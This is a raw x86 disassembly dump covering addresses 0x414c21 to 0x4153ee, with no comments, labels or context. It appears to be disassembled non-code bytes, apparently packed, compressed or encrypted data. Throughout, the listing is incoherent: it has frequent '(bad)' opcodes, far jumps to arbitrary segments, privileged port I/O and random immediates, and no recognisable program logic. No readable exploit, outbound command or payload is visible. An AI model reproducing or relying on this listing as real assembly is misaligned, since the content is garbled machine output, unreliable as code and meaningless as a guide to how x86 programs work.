  414c21:	jo     0x414c1f
  414c23:	lods   eax,DWORD PTR ds:[esi]
  414c24:	sbb    ebx,eax
  414c26:	fisub  DWORD PTR [ecx+0x6598946c]
  414c2c:	adc    esp,esp
  414c2e:	pop    ebp
  414c2f:	imul   esp,DWORD PTR [esi+esi*4],0xfffffffb
  414c33:	xchg   esi,eax
  414c34:	pop    ecx
  414c35:	imul   DWORD PTR [esi-0x77]
  414c38:	cmp    eax,0xcdc9743e
  414c3d:	cmc    
  414c3e:	xchg   ebp,eax
  414c3f:	mov    ebp,0x7f837f40
  414c44:	lds    esi,FWORD PTR [ebx]
  414c46:	ror    edi,0x6
  414c49:	sbb    eax,0xfdb88649
  414c4e:	(bad)  
  414c4f:	in     al,0xbc
  414c51:	arpl   bp,cx
  414c53:	sbb    BYTE PTR [eax-0x7],bl
  414c56:	and    bl,0x73
  414c59:	mov    ch,0xfa
  414c5b:	or     al,0xce
  414c5d:	enter  0x161c,0xde
  414c61:	xchg   esp,eax
  414c63:	imul   esp,DWORD PTR [ecx-0x60],0x722b6e26
  414c6a:	sub    ecx,DWORD PTR [ebx+esi*8+0x34a0fe0d]
  414c71:	cwd    
  414c73:	and    cl,BYTE PTR [edi+0x62196cc0]
  414c79:	push   es
  414c7a:	and    esp,ebp
  414c7c:	lock retf 0x3100
  414c80:	adc    dl,cl
  414c82:	addr16 dec esp
  414c84:	ds jbe 0x414c36
  414c87:	inc    eax
  414c88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c89:	enter  0xf0b6,0x5e
  414c8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c8e:	iret   
  414c8f:	std    
  414c90:	bound  ecx,QWORD PTR [ebp+edi*8+0x4832355b]
  414c97:	sahf   
  414c98:	leave  
  414c99:	push   es
  414c9a:	mov    ah,0x5d
  414c9c:	jns    0x414c76
  414c9e:	jecxz  0x414c2d
  414ca0:	out    0xeb,al
  414ca2:	xlat   BYTE PTR ds:[ebx]
  414ca3:	mov    al,ds:0x275417cb
  414ca8:	cmp    eax,0xdb461599
  414cad:	jmp    0xc4c4:0x2bdc08ae
  414cb4:	popa   
  414cb5:	inc    ebx
  414cb6:	xor    BYTE PTR [eax],0x9c
  414cb9:	in     al,0xe
  414cbb:	std    
  414cbc:	cld    
  414cbd:	inc    ebx
  414cbe:	cld    
  414cbf:	sbb    esp,edi
  414cc1:	and    al,0x59
  414cc3:	ret    0x40c0
  414cc6:	fcom   DWORD PTR [ecx-0x6ca97010]
  414ccc:	mov    esp,0xd421103d
  414cd1:	(bad)  
  414cd2:	or     ebx,DWORD PTR [ebx+0x4e0e8765]
  414cd8:	enter  0xc011,0xc3
  414cdc:	ret    0x3f0b
  414cdf:	push   edi
  414ce0:	(bad)  
  414ce2:	sbb    bl,BYTE PTR [edx+0x1f98777]
  414ce8:	pop    ss
  414ce9:	mov    dl,0x8b
  414ceb:	ret    
  414cec:	dec    edx
  414ced:	call   0x70684c9d
  414cf2:	push   cs
  414cf3:	push   edx
  414cf4:	xor    dl,BYTE PTR [ebp+0x10]
  414cf7:	inc    edi
  414cf8:	xchg   bl,ah
  414cfa:	lea    esi,[ebx]
  414cfc:	imul   ebp,DWORD PTR [esi],0x31
  414cff:	das    
  414d00:	mov    ebp,0x17855ba
  414d05:	(bad)  
  414d06:	cdq    
  414d07:	mov    dh,0x1b
  414d09:	inc    edx
  414d0a:	add    al,0x4a
  414d0c:	inc    eax
  414d0d:	in     al,dx
  414d0e:	sub    al,0x2c
  414d10:	lahf   
  414d11:	dec    eax
  414d12:	fcom   QWORD PTR [ecx-0x241c814c]
  414d18:	jmp    0x44e6:0x757d0445
  414d1f:	sub    DWORD PTR [edx-0x759208fd],ebx
  414d25:	into   
  414d26:	mov    ?,WORD PTR [ecx+0xd3c7b05]
  414d2c:	add    eax,0x4dc76d74
  414d31:	mov    ah,0xa9
  414d33:	cmp    ch,BYTE PTR [ecx-0x3fad9a08]
  414d39:	fdivr  DWORD PTR [ebx+edx*2+0x43]
  414d3d:	test   al,0x4b
  414d3f:	out    dx,al
  414d40:	(bad)  
  414d41:	fistp  DWORD PTR [ecx+0xb8464c6]
  414d47:	push   ds
  414d48:	shl    BYTE PTR [ebp+0x3d],0xbb
  414d4c:	push   esp
  414d4d:	fdiv   QWORD PTR [eax+0x1172351f]
  414d53:	(bad)  
  414d54:	jmp    0x414d53
  414d56:	iret   
  414d57:	and    BYTE PTR [ecx+0xcf4244b],ah
  414d5d:	in     al,dx
  414d5e:	push   edx
  414d5f:	xchg   edi,eax
  414d60:	pop    ds
  414d61:	int    0x14
  414d63:	leave  
  414d64:	fadd   DWORD PTR [ebp-0x34f9aee3]
  414d6a:	das    
  414d6b:	imul   ebx,DWORD PTR [eax-0x52],0xffffffc3
  414d6f:	xchg   edi,eax
  414d70:	push   esi
  414d71:	stc    
  414d72:	xchg   edi,eax
  414d73:	mov    bl,0x5d
  414d75:	mov    cl,0x2f
  414d77:	enter  0x992a,0xcc
  414d7b:	call   0x74ad:0xf990292
  414d82:	pop    ecx
  414d83:	(bad)  
  414d84:	jle    0x414dee
  414d86:	pop    ecx
  414d87:	pop    ss
  414d88:	inc    edx
  414d89:	test   al,0x21
  414d8b:	sbb    cl,ch
  414d8d:	pop    esi
  414d8e:	pop    eax
  414d8f:	pop    eax
  414d90:	lods   al,BYTE PTR ds:[esi]
  414d92:	leave  
  414d93:	xchg   esp,eax
  414d94:	movntps XMMWORD PTR [edx+0x69],xmm3
  414d98:	enter  0xb3d2,0x8
  414d9c:	dec    esp
  414d9d:	sbb    dh,BYTE PTR [edx-0x58c341e8]
  414da3:	int3   
  414da4:	jecxz  0x414e00
  414da6:	sub    ch,BYTE PTR [ecx-0x19]
  414da9:	shl    BYTE PTR [edi+0x15cb26d7],1
  414daf:	cmp    eax,0x15e2c900
  414db4:	cmp    ebx,esi
  414db6:	adc    DWORD PTR [ecx+ebx*8],esp
  414db9:	mov    eax,0xf45721c1
  414dbe:	sbb    ebx,DWORD PTR [ecx]
  414dc0:	aas    
  414dc1:	jae    0x414d6d
  414dc3:	pop    ecx
  414dc4:	xchg   esi,eax
  414dc5:	imul   esi,eax,0xffffffc2
  414dc8:	add    eax,0x7cb6548f
  414dcd:	jle    0x414d86
  414dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dd0:	and    eax,0x58aff22
  414dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dd6:	jno    0x414db6
  414dd8:	push   ebx
  414dd9:	(bad)  
  414ddb:	and    DWORD PTR [ebx+0x2202e15e],0xffffffb7
  414de2:	xchg   edx,eax
  414de3:	hlt    
  414de4:	std    
  414de5:	push   esi
  414de6:	adc    BYTE PTR [ebp+0x7a],cl
  414de9:	and    bl,BYTE PTR [ecx]
  414deb:	mov    ah,0x32
  414ded:	hlt    
  414dee:	adc    BYTE PTR [edx+0x2650a151],dl
  414df4:	enter  0x4d58,0x18
  414df8:	xor    BYTE PTR [edi-0x54],dl
  414dfb:	jns    0x414dd7
  414dfd:	pop    ds
  414dfe:	jge    0x414dd2
  414e00:	dec    esp
  414e01:	fld    DWORD PTR fs:[esi-0x6b]
  414e05:	inc    ebx
  414e06:	loope  0x414df6
  414e08:	jmp    0x3c79e37d
  414e0d:	bnd ja 0x414e00
  414e10:	imul   esp,eax,0x55
  414e13:	gs or  esi,ecx
  414e16:	scas   eax,DWORD PTR es:[edi]
  414e17:	sahf   
  414e18:	dec    edx
  414e19:	and    eax,0xa962029
  414e1e:	push   ebx
  414e1f:	data16 lahf 
  414e21:	push   edx
  414e22:	lods   al,BYTE PTR ds:[esi]
  414e23:	fnsave [ebp+0x6ff00525]
  414e29:	mov    ds:0x45b76b14,al
  414e2e:	and    BYTE PTR [edx+0x39],ch
  414e31:	xor    BYTE PTR [edx+0x4f],dl
  414e34:	fwait
  414e35:	bound  edi,QWORD PTR [esi+0xe]
  414e38:	stos   BYTE PTR es:[edi],al
  414e39:	jecxz  0x414e02
  414e3b:	jecxz  0x414eac
  414e3d:	scas   eax,DWORD PTR es:[edi]
  414e3e:	fld    DWORD PTR [edx+0x335922aa]
  414e44:	lea    edi,[ecx+eax*8+0x2a]
  414e48:	dec    eax
  414e49:	mov    bh,0xe4
  414e4b:	loopne 0x414e46
  414e4d:	scas   al,BYTE PTR es:[edi]
  414e4e:	inc    edx
  414e4f:	xor    bl,BYTE PTR [ebx+0x326d63a7]
  414e55:	sar    dh,1
  414e57:	inc    esi
  414e58:	xchg   ebp,eax
  414e59:	addr16 jle 0x414e18
  414e5c:	or     bh,al
  414e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e5f:	icebp  
  414e60:	fcmovnb st,st(7)
  414e62:	mov    WORD PTR [ecx+0x14f8e9ff],ds
  414e68:	popf   
  414e69:	mov    ecx,edx
  414e6b:	les    ebx,FWORD PTR [ebx]
  414e6d:	xor    al,0x67
  414e6f:	push   0xffffffc6
  414e71:	int    0xe7
  414e73:	and    eax,0x29a722f8
  414e78:	push   edx
  414e79:	es sbb cl,ch
  414e7c:	or     ecx,DWORD PTR [eax+0x3a4370d3]
  414e82:	push   ebx
  414e83:	cmp    ah,bh
  414e85:	in     al,dx
  414e86:	jg     0x414ed9
  414e88:	sbb    dh,BYTE PTR [ebp+0x4e]
  414e8b:	retf   0xc6e7
  414e8e:	dec    edi
  414e8f:	pop    ss
  414e90:	xchg   ebx,eax
  414e91:	inc    esp
  414e92:	outs   dx,DWORD PTR ds:[esi]
  414e93:	push   esi
  414e94:	mov    ds,ecx
  414e96:	fwait
  414e97:	jnp    0x414e5f
  414e99:	rcl    BYTE PTR [ebp-0x1a],1
  414e9c:	pop    ecx
  414e9d:	add    BYTE PTR [eax],0x61
  414ea0:	das    
  414ea1:	dec    esi
  414ea2:	pop    esi
  414ea3:	ret    
  414ea4:	pop    ds
  414ea5:	pop    ebp
  414ea6:	cmp    ecx,edi
  414ea8:	xor    BYTE PTR [ecx],0x43
  414eab:	and    DWORD PTR ds:0x6c29a3ae,ecx
  414eb1:	js     0x414ede
  414eb3:	inc    ebp
  414eb4:	inc    eax
  414eb5:	jle    0x414e86
  414eb7:	sbb    BYTE PTR [ebx+0x7e],0x9a
  414ebb:	lea    ebp,[ecx]
  414ebd:	stos   DWORD PTR es:[edi],eax
  414ebe:	jg     0x414ef2
  414ec0:	(bad)  
  414ec1:	stos   BYTE PTR es:[edi],al
  414ec2:	adc    eax,0xdc591f52
  414ec7:	push   0x2357b82f
  414ecc:	call   0xc488:0x5b9ead9b
  414ed3:	xchg   DWORD PTR [edi-0x3145139f],eax
  414ed9:	inc    esp
  414eda:	bound  ecx,QWORD PTR [edi+esi*2]
  414edd:	pop    ecx
  414ede:	or     al,0x1d
  414ee0:	shl    DWORD PTR [ebp+0x5930d26d],cl
  414ee6:	adc    BYTE PTR [eax+0x19],dl
  414ee9:	aad    0x8d
  414eeb:	mov    bh,0x3a
  414eed:	cdq    
  414eee:	(bad)  
  414eef:	scas   al,BYTE PTR es:[edi]
  414ef0:	mov    eax,ds:0xbc216dd1
  414ef5:	mov    edi,0x546c5337
  414efa:	ja     0x414ea7
  414efc:	xchg   DWORD PTR ds:0xd5c4f88c,ebp
  414f02:	in     eax,dx
  414f03:	mov    edx,0x1902f43f
  414f08:	and    eax,0x782269ca
  414f0d:	push   ebx
  414f0e:	jmp    0x5665:0x2114c68d
  414f15:	push   ss
  414f16:	add    eax,0xc30a874d
  414f1b:	(bad)  
  414f1c:	push   ebx
  414f1d:	clc    
  414f1e:	adc    eax,edx
  414f20:	push   esp
  414f21:	jl     0x414ebf
  414f23:	jo     0x414ed0
  414f25:	mov    BYTE PTR [edx],bh
  414f27:	fldenv [ecx+0xc22b2eb]
  414f2d:	test   BYTE PTR [edx+0x4d],dh
  414f30:	mov    al,0x43
  414f32:	loop   0x414ee4
  414f34:	inc    esp
  414f35:	mov    eax,ds:0xc5381fee
  414f3a:	ins    DWORD PTR es:[edi],dx
  414f3b:	jbe    0x414ec8
  414f3d:	lahf   
  414f3e:	push   ecx
  414f3f:	pop    es
  414f40:	adc    eax,0x59cf83b
  414f45:	cmp    al,0x8c
  414f47:	jmp    0x7f66cc17
  414f4c:	dec    ebp
  414f4d:	ins    DWORD PTR es:[edi],dx
  414f4e:	imul   esi,ebx,0xa8935fe7
  414f54:	jb     0x414f88
  414f56:	in     al,0xdf
  414f58:	fprem1 
  414f5a:	repnz icebp 
  414f5c:	inc    esi
  414f5d:	out    0x1f,al
  414f5f:	push   esi
  414f60:	ret    0x5771
  414f63:	mov    DWORD PTR [edi-0x34],ebx
  414f66:	retf   0x7743
  414f69:	pop    ss
  414f6a:	push   0xffffff88
  414f6c:	and    ah,0x9d
  414f6f:	inc    ebp
  414f70:	fucomp st(2)
  414f72:	push   ds
  414f73:	jecxz  0x414fc6
  414f75:	mov    bl,0x93
  414f77:	in     eax,dx
  414f78:	xor    eax,0x15612760
  414f7d:	pop    es
  414f7e:	mov    ah,0x57
  414f80:	dec    eax
  414f81:	or     DWORD PTR [edi-0x58],ebp
  414f84:	lock mov ebp,0xb472616c
  414f8a:	fld    DWORD PTR [edi-0x4c20e9ff]
  414f90:	clc    
  414f91:	not    DWORD PTR [edx+0x5f568e4a]
  414f97:	(bad)  
  414f98:	mov    al,ds:0x88aa31f9
  414f9d:	cmp    dh,dl
  414f9f:	repnz cld 
  414fa1:	je     0x414ff0
  414fa3:	lds    edi,FWORD PTR [ecx-0xc]
  414fa6:	sbb    DWORD PTR ds:0x78878660,edi
  414fac:	cmp    al,dh
  414fae:	rcl    DWORD PTR [ebp+0x79],0xc7
  414fb2:	mov    ch,0xb3
  414fb4:	(bad)  
  414fb5:	mov    esp,0x995d5025
  414fba:	jecxz  0x414fc1
  414fbc:	mov    ebp,0x1ea69f9a
  414fc1:	inc    DWORD PTR [edi+0x46688d48]
  414fc7:	int    0x79
  414fc9:	les    esp,FWORD PTR [ecx+eiz*2]
  414fcc:	shl    BYTE PTR [ebx+0x1aac3430],0x1f
  414fd3:	jmp    0x66f2:0xea64bdb
  414fda:	adc    ebx,0xffffff9c
  414fdd:	inc    ebx
  414fde:	cmp    eax,0x47d6d8a1
  414fe3:	pop    ebp
  414fe4:	(bad)
  414fe9:	cmp    dl,ch
  414feb:	mov    ds,WORD PTR [eax]
  414fed:	dec    eax
  414fee:	mov    ds:0xd8a3a184,al
  414ff3:	sti    
  414ff4:	jb     0x415012
  414ff6:	lods   al,BYTE PTR ds:[esi]
  414ff7:	dec    ebp
  414ff8:	punpckldq mm7,mm5
  414ffb:	es pop eax
  414ffd:	enter  0x113d,0xbc
  415001:	xlat   BYTE PTR ds:[ebx]
  415002:	xchg   esp,eax
  415003:	pusha  
  415004:	pop    edi
  415005:	dec    edx
  415006:	rcr    DWORD PTR [edx],cl
  415008:	mov    WORD PTR [ecx],ds
  41500a:	dec    edi
  41500b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41500c:	xor    eax,0xcb3d0a03
  415011:	sbb    al,0xc5
  415013:	or     BYTE PTR ds:0xdc868843,cl
  415019:	sbb    al,0xd9
  41501c:	push   0x947e0b5e
  415021:	mov    ebp,0x3194c3a1
  415026:	fst    QWORD PTR [ebp+0x7f]
  415029:	push   edx
  41502a:	xchg   edx,eax
  41502b:	lahf   
  41502c:	popf   
  41502d:	dec    ebp
  41502f:	mov    ds:0xd4480662,al
  415034:	cmp    DWORD PTR [esi-0x61d5f46f],eax
  41503a:	pop    edi
  41503b:	mov    ecx,0x32dcf3fb
  415040:	push   ds
  415041:	arpl   WORD PTR [esi+eax*4-0x79921bdf],bx
  415048:	arpl   WORD PTR [esi],sp
  41504a:	mov    ecx,0xa4d4c1ac
  41504f:	lea    esp,ds:0x25f3fa03
  415055:	hlt    
  415056:	inc    esi
  415057:	adc    al,0x33
  415059:	inc    ecx
  41505a:	in     eax,0x93
  41505c:	push   eax
  41505d:	sbb    al,BYTE PTR [edx+0x3]
  415060:	dec    edi
  415061:	loope  0x4150db
  415063:	dec    ebp
  415064:	fild   DWORD PTR [edi]
  415066:	jae    0x41500b
  415068:	lods   eax,DWORD PTR ds:[esi]
  415069:	adc    al,0xcc
  41506b:	sbb    eax,0xfbfeeead
  415070:	cmc    
  415071:	fadd   QWORD PTR [edi]
  415073:	cmp    DWORD PTR cs:[eax-0x12],edx
  415077:	je     0x4150d0
  415079:	or     BYTE PTR ds:0x708839b8,cl
  41507f:	aad    0xaf
  415081:	xchg   ebx,eax
  415082:	add    dl,0xe1
  415085:	jns    0x415035
  415087:	sub    al,0xc3
  415089:	or     BYTE PTR [esi-0x249e683c],ah
  41508f:	push   ebp
  415090:	jecxz  0x415042
  415092:	jns    0x415073
  415094:	jg     0x415087
  415096:	xor    bh,ah
  415098:	xchg   DWORD PTR [ecx+0x76],eax
  41509b:	outs   dx,BYTE PTR ds:[esi]
  41509c:	loope  0x4150dd
  41509e:	(bad)  
  41509f:	and    ebx,edx
  4150a1:	mov    ah,0xbc
  4150a3:	xor    dl,dl
  4150a5:	sahf   
  4150a6:	inc    edi
  4150a7:	push   ebx
  4150a8:	or     eax,0xf70e40e4
  4150ad:	mov    esp,0x8a3e05a0
  4150b2:	outs   dx,DWORD PTR ds:[esi]
  4150b3:	mov    al,0x8c
  4150b5:	sahf   
  4150b6:	test   BYTE PTR [edi-0x1b],al
  4150b9:	icebp  
  4150ba:	cwde   
  4150bb:	fist   DWORD PTR [ebp+eax*8-0x65]
  4150bf:	(bad)  
  4150c0:	mov    ds:0x3d961eb2,al
  4150c5:	push   0xffffff95
  4150c7:	je     0x415065
  4150c9:	in     al,dx
  4150ca:	addr16 push edx
  4150cc:	fidivr DWORD PTR [eax-0x3]
  4150cf:	adc    al,0xdd
  4150d1:	push   ss
  4150d2:	lods   eax,DWORD PTR ds:[esi]
  4150d3:	mov    ch,0x2e
  4150d5:	mov    DWORD PTR [ebx+ebx*2],esp
  4150d8:	or     al,0x85
  4150da:	jo     0x415101
  4150dc:	repz mov ebp,0xcddd234e
  4150e2:	adc    eax,0xae169338
  4150e7:	ret    
  4150e8:	jl     0x4150a2
  4150ea:	dec    edi
  4150eb:	stc    
  4150ec:	xchg   ebx,eax
  4150ed:	adc    DWORD PTR [ebp-0x5414a9bd],ebp
  4150f3:	jge    0x41510f
  4150f5:	push   edi
  4150f6:	mov    eax,ds:0x9a60a896
  4150fb:	out    dx,eax
  4150fc:	inc    eax
  4150fd:	jmp    0x3950a012
  415102:	jo     0x41508c
  415104:	jg     0x415154
  415106:	xchg   edx,eax
  415107:	mov    ch,0xcc
  415109:	jns    0x4150d1
  41510b:	pop    ds
  41510c:	sub    eax,DWORD PTR [esp+esi*4+0x7aa7aeb3]
  415113:	(bad)  
  415114:	jo     0x415119
  415116:	dec    edi
  415117:	jg     0x4150b6
  415119:	pop    ebp
  41511a:	mov    cl,BYTE PTR [edi-0x52636562]
  415120:	sbb    al,0x91
  415122:	in     al,0xc3
  415124:	out    0xeb,al
  415126:	pop    esi
  415127:	sub    DWORD PTR [edx+0xf],ebx
  41512a:	mov    dh,0xcf
  41512c:	stos   DWORD PTR es:[edi],eax
  41512d:	mov    ch,0xcd
  41512f:	pop    ebx
  415130:	minps  xmm2,XMMWORD PTR [edx-0x14]
  415134:	(bad)  
  415135:	(bad)  
  415137:	popa   
  415138:	mov    edi,DWORD PTR [esi-0x34ac4008]
  41513e:	scas   eax,DWORD PTR es:[edi]
  41513f:	(bad)  
  415140:	xchg   ebx,eax
  415141:	nop
  415142:	outs   dx,DWORD PTR ds:[esi]
  415143:	sub    dh,bl
  415145:	pop    esp
  415146:	adc    al,0x3a
  415148:	arpl   WORD PTR [edi],sp
  41514a:	lahf   
  41514b:	sbb    edx,DWORD PTR gs:[ecx-0x10]
  41514f:	enter  0x9d3d,0xf4
  415153:	mov    ch,0xaf
  415155:	into   
  415156:	push   ds
  415157:	mov    esi,0xbfa418e0
  41515c:	es retf 
  41515e:	sbb    dl,BYTE PTR [ebx-0x7f9cf139]
  415164:	shr    BYTE PTR [eax],0x57
  415167:	pop    ss
  415168:	push   ebx
  415169:	fwait
  41516a:	lahf   
  41516b:	xor    ebx,DWORD PTR [edx+0x35]
  41516e:	cs push edi
  415170:	movntps XMMWORD PTR ds:[edx+0x441e88e8],xmm3
  415178:	ins    DWORD PTR es:[edi],dx
  415179:	sub    BYTE PTR [ebp+0x75],dl
  41517c:	fstp   DWORD PTR [edi-0x5d69ac38]
  415182:	mov    DWORD PTR [eax],esi
  415184:	sahf   
  415185:	outs   dx,DWORD PTR ds:[esi]
  415186:	or     al,0x2b
  415188:	dec    ebp
  415189:	mov    ebp,0x888a63a
  41518e:	adc    eax,0xb45fad1b
  415193:	jmp    0x4151cd
  415195:	push   0xfffffff5
  415197:	pusha  
  415198:	mov    ds:0xfa38ed9a,eax
  41519d:	push   edi
  41519e:	mov    esp,0x266e6f88
  4151a3:	xchg   BYTE PTR [edi+0x4dc7a86d],ah
  4151a9:	int    0x4b
  4151ab:	rcr    DWORD PTR [ebp+0x5e],1
  4151ae:	push   cs
  4151af:	jmp    0xf898410b
  4151b4:	pop    edi
  4151b5:	bound  edi,QWORD PTR [edi+0x69]
  4151b8:	loope  0x415145
  4151ba:	test   DWORD PTR [edx],edi
  4151bc:	or     DWORD PTR [ebx*8+0x689b8a9b],edx
  4151c3:	sbb    esi,edx
  4151c5:	fwait
  4151c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151c7:	or     eax,0xb95d2594
  4151cc:	pop    esp
  4151cd:	addr16 jae 0x4151ff
  4151d0:	cwde   
  4151d1:	fs inc eax
  4151d3:	cld    
  4151d4:	outs   dx,BYTE PTR ds:[esi]
  4151d5:	(bad)
  4151d8:	ret    0xf65e
  4151db:	xor    DWORD PTR [ebx-0x9],ebx
  4151de:	inc    eax
  4151df:	mov    esi,0x4297856e
  4151e4:	cmp    al,0xd8
  4151e6:	mov    eax,0x5d7ce4b3
  4151eb:	fist   WORD PTR ds:0xc0990efb
  4151f1:	(bad)  [ecx+0x53]
  4151f4:	fild   QWORD PTR [ebx+0x7e579923]
  4151fa:	jnp    0x41521d
  4151fc:	out    0x5d,al
  4151fe:	mov    edx,DWORD PTR [esi-0x4ce5f483]
  415204:	(bad)  
  415205:	jle    0x415211
  415207:	popf   
  415208:	hlt    
  415209:	adc    edi,ecx
  41520b:	xor    al,bl
  41520d:	mov    ecx,0xd2490591
  415212:	sbb    ecx,DWORD PTR [eax+0x7c]
  415215:	(bad)
  415219:	pop    ss
  41521a:	jmp    0xda3c75e2
  41521f:	adc    al,0x4c
  415221:	out    dx,al
  415222:	add    bh,dl
  415224:	fcom   QWORD PTR [eax+0x23c31dee]
  41522a:	aad    0x16
  41522c:	stc    
  41522d:	push   ss
  41522e:	fmul   QWORD PTR [ebx+0x3074a652]
  415234:	sahf   
  415235:	mov    cl,0xde
  415237:	or     BYTE PTR [eax],ch
  415239:	sbb    eax,0xad42235e
  41523e:	mov    al,ds:0xe950519e
  415243:	jb     0x415289
  415245:	cmp    al,0xf3
  415247:	es hlt 
  415249:	ret    
  41524a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41524b:	aad    0x7b
  41524d:	nop
  41524e:	xchg   ecx,eax
  41524f:	cwde   
  415250:	aad    0x6
  415252:	repz jg 0x41520a
  415255:	stos   DWORD PTR es:[edi],eax
  415256:	jle    0x4151f1
  415258:	cdq    
  415259:	adc    eax,0x4501faa4
  41525e:	and    esp,esp
  415260:	aam    0x70
  415262:	fiadd  WORD PTR [edi-0x6022b0fc]
  415268:	std    
  415269:	jb     0x4152e5
  41526b:	adc    DWORD PTR [edx-0x7271e22],ebx
  415271:	lock pop ecx
  415273:	ds ins BYTE PTR es:[edi],dx
  415275:	mov    bl,0xac
  415277:	shl    cl,cl
  415279:	aaa    
  41527a:	inc    edi
  41527b:	cwde   
  41527c:	std    
  41527d:	sub    edi,eax
  41527f:	test   BYTE PTR [ebx+0xd],cl
  415282:	fmul   DWORD PTR [ecx+0x1e09ef39]
  415288:	push   edi
  415289:	in     al,0x4
  41528b:	pop    es
  41528c:	or     eax,0xa7bacf7b
  415291:	inc    esp
  415292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415293:	inc    edx
  415294:	leave  
  415295:	add    eax,ebx
  415297:	ror    DWORD PTR [edx+0x50c0605d],1
  41529d:	out    dx,eax
  41529e:	inc    edx
  41529f:	mov    esp,0x237a2e19
  4152a4:	sbb    esi,DWORD PTR [ebp+0x6482d7e6]
  4152aa:	outs   dx,BYTE PTR ds:[esi]
  4152ab:	adc    DWORD PTR [edx],ebx
  4152ad:	mov    ds:0xd68f07ec,al
  4152b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152b3:	or     bh,BYTE PTR [esi]
  4152b5:	stos   DWORD PTR es:[edi],eax
  4152b6:	pop    esi
  4152b7:	loopne 0x41526d
  4152b9:	in     eax,0x6d
  4152bb:	xor    ebp,0x33a09ec1
  4152c1:	test   al,0x54
  4152c3:	out    dx,al
  4152c4:	xchg   ecx,eax
  4152c5:	rcr    BYTE PTR [ebx],0x34
  4152c8:	popa   
  4152c9:	fstp   QWORD PTR [ecx-0x53f5d5ce]
  4152cf:	adc    bl,cl
  4152d1:	loop   0x415284
  4152d3:	add    BYTE PTR [ecx],dh
  4152d5:	imul   edi,DWORD PTR [edi+0x45f685f7],0xfffffff0
  4152dc:	dec    ebx
  4152dd:	test   BYTE PTR [edi+0x62],0x73
  4152e1:	xor    eax,0xa3dbd502
  4152e6:	es xchg edx,eax
  4152e8:	jb     0x415274
  4152ea:	mov    esi,gs
  4152ec:	cld    
  4152ed:	add    BYTE PTR ds:0x596cec87,dh
  4152f3:	(bad)  
  4152f4:	fild   QWORD PTR [edx]
  4152f6:	into   
  4152f7:	push   ecx
  4152f8:	add    ecx,edx
  4152fa:	xchg   esp,eax
  4152fb:	push   edx
  4152fc:	mov    ds:0x5f397ba,al
  415301:	pop    ebp
  415302:	mov    cl,0x67
  415304:	cmp    esp,DWORD PTR [edx]
  415306:	int3   
  415307:	out    dx,eax
  415308:	repnz push eax
  41530a:	mov    ds:0xe68239f7,al
  41530f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415310:	cmp    BYTE PTR [edx+0x143bfff],bh
  415316:	lods   al,BYTE PTR ds:[esi]
  415317:	sub    ch,BYTE PTR [edx]
  415319:	fstp   st(3)
  41531b:	pop    ecx
  41531c:	mov    eax,0x4936450b
  415321:	push   esi
  415322:	jo     0x4152fc
  415324:	out    dx,al
  415325:	adc    bl,dl
  415327:	cmp    BYTE PTR [esp+edx*2-0x1f],bh
  41532b:	xchg   ebx,eax
  41532c:	sub    dl,0x36
  41532f:	stc    
  415330:	ficom  DWORD PTR [ebp+0x7f7f979d]
  415336:	jle    0x41536a
  415338:	ret    0xbb8e
  41533b:	or     eax,0x9047934b
  415340:	lahf   
  415341:	jge    0x41537d
  415343:	and    eax,0xf69ab835
  415348:	fnstenv [edx+0x5c834fc4]
  41534e:	and    DWORD PTR [esi-0x15],ecx
  415351:	ja     0x415349
  415353:	into   
  415354:	jae    0x4153bf
  415356:	xchg   ebx,eax
  415357:	in     al,0xe2
  415359:	loopne 0x4152f8
  41535b:	jns    0x4152fe
  41535d:	mov    eax,0x56ae6d9c
  415362:	add    DWORD PTR [esi-0x6c],ecx
  415365:	cmp    al,0x60
  415367:	(bad)  
  415368:	mov    dl,0xd3
  41536a:	dec    ecx
  41536b:	inc    esi
  41536c:	js     0x4153d1
  41536e:	fisttp DWORD PTR [ecx]
  415370:	aam    0x9d
  415372:	outs   dx,DWORD PTR ds:[esi]
  415373:	cwde   
  415374:	aaa    
  415375:	iret   
  415376:	pop    esp
  415377:	shl    esp,1
  415379:	fdivr  QWORD PTR [edx]
  41537b:	scas   al,BYTE PTR es:[edi]
  41537c:	ins    BYTE PTR es:[edi],dx
  41537d:	(bad)  
  41537e:	lods   eax,DWORD PTR ds:[esi]
  41537f:	inc    eax
  415380:	push   ebp
  415381:	mov    ebp,0xb7bf6273
  415386:	into   
  415387:	mov    BYTE PTR [eax-0x6e],ah
  41538a:	test   eax,0xe8f2f568
  41538f:	aaa    
  415390:	sub    al,0xc6
  415392:	xchg   ebp,eax
  415393:	xchg   ecx,eax
  415394:	outs   dx,DWORD PTR ds:[esi]
  415395:	jns    0x415358
  415397:	inc    esp
  415398:	inc    edx
  415399:	push   0x14
  41539b:	int3   
  41539c:	imul   eax,DWORD PTR [eax],0xffffffd5
  41539f:	mov    ds:0x4f90b071,al
  4153a4:	test   esi,0xcd377ba8
  4153aa:	sub    eax,0x305c63bc
  4153af:	mov    fs,esi
  4153b1:	inc    ebx
  4153b2:	mov    esp,0x7885f1bf
  4153b7:	add    bl,BYTE PTR [ecx-0x55]
  4153ba:	and    esi,eax
  4153bc:	jmp    0x4153c3
  4153be:	jns    0x4153ed
  4153c0:	adc    DWORD PTR [eax+edx*2-0x27],edx
  4153c4:	mov    ds:0xbafd0551,al
  4153c9:	dec    esp
  4153ca:	daa    
  4153cb:	xchg   esi,eax
  4153cc:	adc    esp,DWORD PTR [ecx+0x68]
  4153cf:	cs es cmp eax,0x123096d7
  4153d6:	mov    WORD PTR [ebx-0x5a8f0899],?
  4153dc:	aas    
  4153dd:	jl     0x4153f4
  4153df:	dec    eax
  4153e0:	in     eax,0x64
  4153e2:	stos   BYTE PTR es:[edi],al
  4153e3:	je     0x41545f
  4153e5:	mov    ch,BYTE PTR [edx]
  4153e7:	inc    ebx
  4153e8:	fwait
  4153e9:	imul   edx,DWORD PTR [edx-0x6b],0x6d
  4153ed:	cwde   
  4153ee:	jmp    0xe7ce:0x935dc079
